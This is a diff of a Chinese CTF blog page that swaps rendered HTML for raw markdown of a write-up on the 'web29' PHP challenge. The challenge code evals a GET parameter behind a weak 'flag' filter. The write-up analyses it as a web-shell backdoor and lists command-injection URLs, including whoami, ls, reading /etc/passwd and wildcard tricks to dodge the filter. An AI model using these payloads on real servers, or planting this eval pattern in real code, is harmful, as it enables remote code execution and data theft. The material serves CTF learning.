@@ -207,51 +207,93 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+            <?php
 
-<p>这段 PHP 代码是一个典型的<strong>Web Shell 后门</strong>或<strong>代码执行漏洞</strong>的实现，具有明显的安全风险。以下是详细分析：</p>
-<hr>
-<h3 id="代码逐行解析"><a href="#代码逐行解析" class="headerlink" title="代码逐行解析"></a><strong>代码逐行解析</strong></h3><h4 id="1-错误报告关闭"><a href="#1-错误报告关闭" class="headerlink" title="1. 错误报告关闭"></a>1. 错误报告关闭</h4><p>error_reporting(0);</p>
-<ul>
-<li>关闭所有 PHP 错误提示</li>
-<li><strong>攻击者目的</strong>：隐藏代码执行过程中可能产生的错误信息，避免暴露线索</li>
-</ul>
-<h4 id="2-检查-GET-参数"><a href="#2-检查-GET-参数" class="headerlink" title="2. 检查 GET 参数"></a>2. 检查 GET 参数</h4><p>if(isset($_ GET[‘c’])){</p>
-<ul>
-<li>检查是否存在名为<code>c</code>的 GET 参数（如：<code>?c=命令</code>）</li>
-<li>这是攻击者传递恶意代码的入口</li>
-</ul>
-<h4 id="3-简单过滤检查"><a href="#3-简单过滤检查" class="headerlink" title="3. 简单过滤检查"></a>3. 简单过滤检查</h4><p>if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){</p>
-<ul>
-<li>用正则表达式检查参数值是否包含<code>flag</code>（不区分大小写）</li>
-<li><strong>脆弱性</strong>：仅过滤了<code>flag</code>关键词，防御极其薄弱</li>
-<li><strong>绕过方法</strong>：可通过字符串拼接（如<code>fla&quot;.&quot;g</code>）、编码等方式绕过</li>
-</ul>
-<h4 id="4-危险代码执行"><a href="#4-危险代码执行" class="headerlink" title="4. 危险代码执行"></a>4. 危险代码执行</h4><pre><code>eval($c);
-</code></pre>
-<ul>
-<li>使用<code>eval()</code>函数直接执行 GET 参数中的 PHP 代码</li>
-<li><strong>危害</strong>：攻击者可执行任意系统命令、读取文件、反弹 Shell 等</li>
-</ul>
-<h4 id="5-默认行为"><a href="#5-默认行为" class="headerlink" title="5. 默认行为"></a>5. 默认行为</h4><p>}else{<br>highlight_file(<strong>FILE</strong>);<br>}</p>
-<ul>
-<li>如果没有<code>c</code>参数，高亮显示当前文件内容</li>
-<li><strong>攻击者目的</strong>：伪装成普通文件，隐藏后门功能</li>
-</ul>
-<hr>
-<h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a><strong>攻击示例</strong></h3><ol>
-<li><strong>执行系统命令</strong><br><a target="_blank" rel="noopener" href="http://example.com/shell.php">http://example.com/shell.php</a>? c&#x3D;system(‘whoami’);<ul>
-<li>输出当前服务器用户</li>
-<li>? c&#x3D;system(‘ls’); &#x2F;&#x2F;读取目录<br>得到<br>![[web29phpls.png]]</li>
-<li>? c&#x3D;system(‘cp fla?.php 1.txt’)； &#x2F;&#x2F;cp 原文件 复制文件 复制 flag.php 内容到同一目录下的 1.txt<br>Linux cp 命令：复制文件和目录</li>
-</ul>
-</li>
-<li><strong>读取敏感文件</strong><br><a target="_blank" rel="noopener" href="http://example.com/shell.php">http://example.com/shell.php</a>? c&#x3D;echo file_get_contents(‘&#x2F;etc&#x2F;passwd’);<ul>
-<li>读取系统密码文件<br>因为这里有过滤所以不能用这个</li>
-</ul>
-</li>
-<li><strong>绕过<code>flag</code>过滤</strong><br><a target="_blank" rel="noopener" href="http://example.com/shell.php">http://example.com/shell.php</a>? c&#x3D;system(‘cat &#x2F;fla””.g’);<br>url? c&#x3D;system(‘fla?.php’);<br>url ?c&#x3D;phpinfo()<mark style="background: #D2B3FFA6;">；</mark><br>url?c&#x3D;phpinfo?&gt; &#x2F;&#x2F;不一定要用分号</li>
-</ol>
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:26:48
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET['c'])){    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){
+        eval($c);
+    }
+    
+}else{    highlight_file(__FILE__);
+}
+
+这段 PHP 代码是一个典型的**Web Shell 后门**或**代码执行漏洞**的实现，具有明显的安全风险。以下是详细分析：
+
+---
+
+### **代码逐行解析**
+
+#### 1. 错误报告关闭
+
+error_reporting(0);
+
+- 关闭所有 PHP 错误提示
+- **攻击者目的**：隐藏代码执行过程中可能产生的错误信息，避免暴露线索
+
+#### 2. 检查 GET 参数
+
+if(isset($\_ GET['c'])){
+
+- 检查是否存在名为`c`的 GET 参数（如：`?c=命令`）
+- 这是攻击者传递恶意代码的入口
+
+#### 3. 简单过滤检查
+
+if(!preg_match("/flag/i", $c)){
+
+- 用正则表达式检查参数值是否包含`flag`（不区分大小写）
+- **脆弱性**：仅过滤了`flag`关键词，防御极其薄弱
+- **绕过方法**：可通过字符串拼接（如`fla"."g`）、编码等方式绕过
+
+#### 4. 危险代码执行
+
+    eval($c);
+
+- 使用`eval()`函数直接执行 GET 参数中的 PHP 代码
+- **危害**：攻击者可执行任意系统命令、读取文件、反弹 Shell 等
+
+#### 5. 默认行为
+
+}else{
+highlight_file(**FILE**);
+}
+
+- 如果没有`c`参数，高亮显示当前文件内容
+- **攻击者目的**：伪装成普通文件，隐藏后门功能
+
+---
+
+### **攻击示例**
+
+1. **执行系统命令**
+   http://example.com/shell.php? c=system('whoami');
+   - 输出当前服务器用户
+   - ? c=system('ls'); //读取目录
+     得到
+     ![[web29phpls.png]]
+   - ? c=system('cp fla?.php 1.txt')； //cp 原文件 复制文件 复制 flag.php 内容到同一目录下的 1.txt
+     Linux cp 命令：复制文件和目录
+2. **读取敏感文件**
+   http://example.com/shell.php? c=echo file_get_contents('/etc/passwd');
+   - 读取系统密码文件
+     因为这里有过滤所以不能用这个
+3. **绕过`flag`过滤**
+   http://example.com/shell.php? c=system('cat /fla"".g');
+   url? c=system('fla?.php');
+   url ?c=phpinfo()<mark style="background: #D2B3FFA6;">；
+   url?c=phpinfo?><p> &#x2F;&#x2F;不一定要用分号</p>
 
             
         </div>
@@ -316,7 +358,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/" style="color: #ff7d73">工具安装</a>
+            <a href="/tags/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/" style="color: #00bcd4">工具安装</a>
         </span>
         
     </div>
@@ -370,7 +412,7 @@
         
         <span class="tag">
             
-            <a href="/tags/ctf/" style="color: #00bcd4">ctf</a>
+            <a href="/tags/ctf/" style="color: #ffa2c4">ctf</a>
         </span>
         
     </div>
